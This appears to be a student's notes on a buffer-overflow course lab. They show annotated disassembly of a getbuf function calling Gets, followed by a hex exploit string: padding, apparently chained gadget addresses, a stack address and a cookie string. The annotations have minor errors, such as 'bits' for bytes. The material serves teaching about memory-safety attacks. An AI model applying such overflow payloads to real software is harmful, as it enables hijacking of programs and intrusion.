...
00000000004017a8 <getbuf>:
  ...
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>    # we input string here to override the
                                                        # return address and excute the touch1()
  4017b9:	48 83 c4 28          	add    $0x28,%rsp       # it news 0x28(40) bits space for input string
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
...
answer for 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 b0 ba fe ff ff 7f 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00
